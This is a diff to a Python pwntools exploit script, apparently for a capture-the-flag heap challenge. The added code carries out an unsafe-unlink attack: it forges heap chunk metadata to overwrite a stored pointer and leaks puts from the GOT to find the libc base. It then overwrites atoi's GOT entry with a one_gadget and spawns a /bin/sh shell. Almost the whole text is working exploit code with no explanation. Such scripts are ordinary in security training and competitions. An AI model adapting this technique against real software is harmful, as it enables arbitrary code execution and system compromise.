@@ -22,7 +22,7 @@ def main():
     def new(size, data):
     	r.sendline("1")
     	r.sendline(str(size))
-    	r.send(data)
+    	r.sendline(data)
 
     def show(idx):
     	r.sendline("2")
@@ -32,7 +32,7 @@ def main():
     	r.sendline("3")
     	r.sendline(str(idx))
     	r.sendline(str(choice)) # 1. overwrite ; 2. append
-    	r.send(data)
+    	r.sendline(data)
 
     def delete(idx):
     	r.sendline("4")
@@ -44,16 +44,31 @@ def main():
 
     # overwrite stored ptr
 
-    fake_chunk = ""
-    fake_chunk += p64(0) # prev_size
-    fake_chunk += p64(0x81) # size
-    fake_chunk += p64(0x602128 - 0x18) # fd
-    fake_chunk += p64(0x602128 - 0x10) # bk
-
-    new(0x80, "A" * 0x7f) # 0
+    new(0x10, "A" * 0xf) # 0 dummy
     new(0x80, "B" * 0x7f) # 1
+    new(0x80, "C" * 0x7f) # 2
 
-    gdb.attach(r)
+    prev_size = 0
+    size = 0x80
+    fd = 0x0602120 + 8 - 0x18
+    bk = 0x0602120 + 8 - 0x10
+    delete(0)
+    new(0, "A" * 0x20 + p64(prev_size) + p64(size) + p64(fd) + p64(bk) + "\x00" * 0x60 + p64(0x80) + p64(0x90) + p64(0)*3)
+    delete(2)
+    
+    edit(1, 1, "A" * 0x10 + p64(exe.got['puts']))
+    show(0)
+    r.recvuntil("Content is ")
+    leak = u64(r.recvn(6) + "\x00\x00")
+    libc.address = leak - libc.sym.puts
+    log.info("libc base addr: {}".format(hex(libc.address)))
+
+    one_gadget = libc.address + 0x4652c
+    edit(1, 1, "A" * 0x10 + p64(exe.got['atoi']))
+    edit(0, 1, p64(one_gadget))
+    r.sendline("/bin/sh\x00")
+
+    
     r.interactive()
 
 
